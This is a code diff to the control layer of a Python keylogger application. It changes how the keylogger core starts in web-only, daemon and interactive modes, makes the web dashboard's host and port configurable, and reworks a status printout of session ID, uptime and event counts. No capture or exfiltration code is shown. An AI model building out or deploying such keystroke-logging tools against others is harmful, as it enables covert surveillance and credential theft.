@@ -109,8 +109,9 @@ class KeyloggerApplication:
                     self._start_interactive_mode()
             else:
                 logger.info("Running in web-only mode")
-                keylogger_thread = threading.Thread(target=self.keylogger_core.run, daemon=True)
-                keylogger_thread.start()
+                if not self.keylogger_core.start():
+                    logger.error("Failed to start keylogger core")
+                    return
                 self._wait_for_shutdown()
             
         except KeyboardInterrupt:
@@ -128,7 +129,10 @@ class KeyloggerApplication:
             
             def run_web_app():
                 try:
-                    self.web_app.run(threaded=True)
+                    host = self.config_manager.get('web.host', '127.0.0.1')
+                    port = self.config_manager.get('web.port', 5000)
+                    debug = bool(self.config_manager.get('web.debug', False))
+                    self.web_app.run(host=host, port=port, debug=debug, threaded=True, use_reloader=False)
                 except Exception as e:
                     logger.error(f"Web interface error: {e}")
             
@@ -150,9 +154,10 @@ class KeyloggerApplication:
         try:
             logger.info("Starting keylogger in daemon mode...")
             
-            # Start keylogger in a separate thread
-            keylogger_thread = threading.Thread(target=self.keylogger_core.run, daemon=True)
-            keylogger_thread.start()
+            # Start keylogger
+            if not self.keylogger_core.start():
+                logger.error("Failed to start keylogger core")
+                return
             
             # Wait for shutdown signal
             self._wait_for_shutdown()
@@ -166,9 +171,10 @@ class KeyloggerApplication:
             logger.info("Starting keylogger in interactive mode...")
             logger.info("Press Ctrl+C to stop")
             
-            # Start keylogger in a separate thread
-            keylogger_thread = threading.Thread(target=self.keylogger_core.run, daemon=True)
-            keylogger_thread.start()
+            # Start keylogger
+            if not self.keylogger_core.start():
+                logger.error("Failed to start keylogger core")
+                return
             
             # Interactive command loop
             self._interactive_loop()
@@ -223,12 +229,12 @@ class KeyloggerApplication:
     def _show_status(self):
         """Show keylogger status."""
         try:
-            status = self.keylogger_core.get_status()
+            stats = self.keylogger_core.get_stats()
             print(f"\nKeylogger Status:")
-            print(f"  Running: {status.get('running', False)}")
-            print(f"  Uptime: {status.get('uptime_hours', 0):.2f} hours")
-            print(f"  Active Window: {status.get('active_window', 'Unknown')}")
-            print(f"  Components: {len(status.get('components', {}))} active")
+            print(f"  Running: {self.keylogger_core.is_running}")
+            print(f"  Session ID: {stats['system']['session_id']}")
+            print(f"  Uptime: {stats['keylogger']['uptime_seconds']:.1f} seconds")
+            print(f"  Total Events: {stats['keylogger']['total_events']}")
             
         except Exception as e:
             print(f"Error getting status: {e}")
